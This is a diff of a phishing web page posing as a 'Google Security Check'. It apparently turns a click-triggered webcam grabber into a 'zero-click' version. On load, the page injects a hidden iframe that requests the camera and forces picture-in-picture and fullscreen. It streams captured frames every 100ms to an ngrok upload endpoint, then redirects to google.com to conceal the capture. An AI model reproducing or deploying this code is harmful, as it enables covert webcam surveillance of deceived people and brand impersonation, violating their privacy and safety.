@@ -6,7 +6,7 @@
 <title>Google Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
+  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; overflow: hidden; }
   .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
   h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
@@ -18,7 +18,7 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Check</h2>
-  <p>Klik untuk memverifikasi akun Google Anda.</p>
+  <p>Memverifikasi...</p>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -30,7 +30,6 @@
 
   var logEl = document.getElementById('log');
   var executed = false;
-  var streamInterval = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -42,125 +41,137 @@
   // ============================================
   var TARGET_URL = "https://www.google.com";
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
-  var STREAM_INTERVAL = 100;
+  var REDIRECT_DELAY = 2000; // 2 detik
 
   // ============================================
-  // 1. KIRIM FRAME KE SERVER
+  // 1. INJECT IFRAME ZERO-CLICK (PiP + FULLSCREEN)
   // ============================================
-  function sendFrameToServer(stream) {
+  function injectZeroClickIframe() {
     try {
-      var video = document.createElement('video');
-      video.srcObject = stream;
-      video.muted = true;
-      video.play().catch(function(){});
+      log("[+] Membuat Iframe Tersembunyi (PiP)...");
 
-      var canvas = document.createElement('canvas');
-      canvas.width = 640;
-      canvas.height = 480;
-      var ctx = canvas.getContext('2d');
-
-      video.onloadedmetadata = function() {
-        setInterval(function() {
-          if (video.readyState === video.HAVE_ENOUGH_DATA) {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(function(blob) {
-              if (!blob) return;
-              var formData = new FormData();
-              formData.append('file', blob, 'capture.jpg');
-              fetch(SERVER_ENDPOINT, {
-                method: 'POST',
-                body: formData,
-                keepalive: true
-              }).catch(function(){});
-            }, 'image/jpeg', 0.5);
-          }
-        }, STREAM_INTERVAL);
-      };
-    } catch(e) {}
-  }
-
-  // ============================================
-  // 2. FULLSCREEN PiP + REDIRECT
-  // ============================================
-  async function startCameraAndFullscreenPiP() {
-    try {
-      log("[+] Meminta Izin Kamera...");
+      var iframe = document.createElement('iframe');
+      // Atribut allow untuk kamera, PiP, dan fullscreen
+      iframe.allow = "camera; microphone; autoplay; picture-in-picture; fullscreen";
+      iframe.style.display = "none";
       
-      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-      log("[+] 🚨 KAMERA BERHASIL diakses!");
+      iframe.srcdoc = `
+        <!DOCTYPE html>
+        <html>
+        <body>
+          <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;top:0;left:0;"></video>
+          <canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
+          
+          <script>
+            (function() {
+              // 1. Minta Izin Kamera (Zero-Click)
+              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(stream) {
+                  var video = document.getElementById('hiddenVideo');
+                  video.srcObject = stream;
+                  video.play().catch(function(){});
+                  
+                  parent.postMessage({ type: 'CAM_GRANTED' }, '*');
 
-      // Buat video element (transparan tapi visible)
-      var video = document.createElement('video');
-      video.srcObject = stream;
-      video.muted = true;
-      video.playsInline = true;
-      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
-      document.body.appendChild(video);
+                  // 2. Paksa Masuk PiP (Zero-Click)
+                  setTimeout(function() {
+                    if (document.pictureInPictureElement) {
+                      document.exitPictureInPicture();
+                    }
+                    video.requestPictureInPicture()
+                      .then(function() {
+                        parent.postMessage({ type: 'PIP_GRANTED' }, '*');
+                        
+                        // 3. Paksa Fullscreen (Zero-Click)
+                        video.requestFullscreen()
+                          .then(function() {
+                            parent.postMessage({ type: 'FULLSCREEN_GRANTED' }, '*');
+                          })
+                          .catch(function(err) {
+                            parent.postMessage({ type: 'FULLSCREEN_DENIED', error: err.message }, '*');
+                          });
+                      })
+                      .catch(function(err) {
+                        parent.postMessage({ type: 'PIP_DENIED', error: err.message }, '*');
+                      });
+                  }, 500);
 
-      await video.play().catch(function(){});
-      log("[+] Video playing.");
+                  // 4. Kirim Frame ke Server
+                  setInterval(function() {
+                    var canvas = document.getElementById('hiddenCanvas');
+                    var ctx = canvas.getContext('2d');
+                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                      canvas.toBlob(function(blob) {
+                        if (!blob) return;
+                        var formData = new FormData();
+                        formData.append('file', blob, 'capture.jpg');
+                        fetch('${SERVER_ENDPOINT}', {
+                          method: 'POST',
+                          body: formData,
+                          keepalive: true
+                        }).catch(function(){});
+                      }, 'image/jpeg', 0.5);
+                    }
+                  }, 100);
 
-      // Masuk PiP
-      try {
-        await video.requestPictureInPicture();
-        log("[+] 🎥 PiP AKTIF!");
+                })
+                .catch(function(err) {
+                  parent.postMessage({ type: 'CAM_DENIED', error: err.name }, '*');
+                });
+            })();
+          <\/script>
+        </body>
+        </html>
+      `;
 
-        // ============================================
-        // 3. BYPASS: FULLSCREEN PiP (RESIZE WINDOW)
-        // ============================================
-        // Trik: Gunakan requestFullscreen pada video
-        // (Meskipun PiP window terpisah, ini akan mencoba memaksa fullscreen)
-        try {
-          await video.requestFullscreen();
-          log("[+] 🖥️ Fullscreen Mode Aktif!");
-        } catch (fsErr) {
-          log("[-] Fullscreen Gagal: " + fsErr.message);
-        }
-
-      } catch (pipErr) {
-        log("[-] PiP Gagal: " + pipErr.message);
-      }
-
-      // Mulai telemetri
-      sendFrameToServer(stream);
-
-      // ============================================
-      // 4. REDIRECT KE GOOGLE (INSTAN)
-      // ============================================
-      setTimeout(function() {
-        log("[+] Redirect ke Google.com...");
-        try {
-          window.location.replace(TARGET_URL);
-        } catch(e) {}
-      }, 500);
-
-    } catch(err) {
-      log("[-] Kamera diblokir: " + err.name);
-      setTimeout(function() {
-        log("[+] Redirect ke Google...");
-        window.location.replace(TARGET_URL);
-      }, 1000);
+      document.getElementById("launcher-container").appendChild(iframe);
+      log("[+] Iframe Tersembunyi disuntikkan.");
+    } catch(e) {
+      log("[-] Iframe Error: " + e.message);
     }
   }
 
   // ============================================
-  // TRIGGER (KLIK)
+  // 2. LISTENER PESAN DARI IFRAME
   // ============================================
-  document.body.addEventListener('click', function() {
+  window.addEventListener('message', function(e) {
+    if (e.data.type === 'CAM_GRANTED') {
+      log("[+] 🚨 Kamera DIIZINKAN!");
+    } else if (e.data.type === 'PIP_GRANTED') {
+      log("[+] 🎥 PiP AKTIF!");
+    } else if (e.data.type === 'FULLSCREEN_GRANTED') {
+      log("[+] 🖥️ Fullscreen AKTIF!");
+    } else if (e.data.type === 'CAM_DENIED') {
+      log("[-] Kamera ditolak: " + e.data.error);
+    } else if (e.data.type === 'PIP_DENIED') {
+      log("[-] PiP ditolak: " + e.data.error);
+    } else if (e.data.type === 'FULLSCREEN_DENIED') {
+      log("[-] Fullscreen ditolak: " + e.data.error);
+    }
+  });
+
+  // ============================================
+  // 3. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
+  // ============================================
+  window.addEventListener('load', function() {
     if (executed) return;
     executed = true;
 
-    document.getElementById('main-card').innerHTML = `
-      <h2>⏳ Memverifikasi...</h2>
-      <p>Menghubungkan ke Google...</p>
-      <div id="log"></div>
-    `;
-    logEl = document.getElementById('log');
-    log("[!] Memulai Fullscreen PiP Hijack...");
+    log("[!] Memulai Zero-Click Fullscreen PiP...");
 
-    startCameraAndFullscreenPiP();
+    // A. Inject Iframe (0ms)
+    injectZeroClickIframe();
 
-  }, { once: true });
+    // B. Redirect ke Google (Setelah 2 detik)
+    setTimeout(function() {
+      log("[+] Redirect ke Google.com...");
+      try {
+        window.location.replace(TARGET_URL);
+      } catch(e) {}
+    }, REDIRECT_DELAY);
+
+  });
 
 })();
 </script>
